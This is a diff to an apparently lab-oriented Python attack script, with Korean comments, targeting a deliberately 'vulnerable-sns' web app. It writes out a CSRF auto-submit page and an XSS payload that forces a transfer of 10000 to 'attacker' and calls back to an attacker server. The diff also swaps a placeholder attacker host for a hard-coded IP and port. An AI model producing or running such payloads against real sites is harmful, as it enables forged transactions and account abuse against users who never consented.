@@ -195,7 +195,7 @@ class VulnerableSNSAttacker:
             document.getElementById('csrf-form').submit();
             
             // 어태커 서버로 신호 전송
-            fetch('{self.attacker_server}/notify?victim=admin&amount=10000');
+            fetch('{self.attacker_server}/csrf-success?victim=admin&amount=10000');
         }};
     </script>
 </body>
@@ -235,7 +235,7 @@ class VulnerableSNSAttacker:
             f.write(csrf_get_html)
         
         # XSS + CSRF 콤보 (게시물에 삽입할 코드)
-        xss_csrf_payload = f"""<img src="{self.base_url}/transfer.php?to=attacker&amount=10000" onerror="fetch('{self.attacker_server}/success')">"""
+        xss_csrf_payload = f"""<img src="{self.base_url}/transfer.php?to=attacker&amount=10000" onerror="fetch('{self.attacker_server}/csrf-success?victim=admin&amount=10000')">"""
         
         with open("xss_csrf_payload.txt", 'w') as f:
             f.write(xss_csrf_payload)
@@ -446,12 +446,9 @@ class VulnerableSNSAttacker:
 # ============ 실행 ============
 if __name__ == "__main__":
     base_url = "http://18.179.53.107/vulnerable-sns/www"
+    attacker_server = "http://13.158.67.78:5000"  # 어태커 서버
     
-    # 어태커 서버 설정 (실제로는 ngrok, RequestBin 등 사용)
-    attacker_server = "http://YOUR-ATTACKER-SERVER.com"
-    
-    attacker = VulnerableSNSAttacker(base_url)
-    attacker.attacker_server = attacker_server
+    attacker = VulnerableSNSAttacker(base_url, attacker_server)
     
     # 전체 공격 실행
     attacker.run_full_attack()
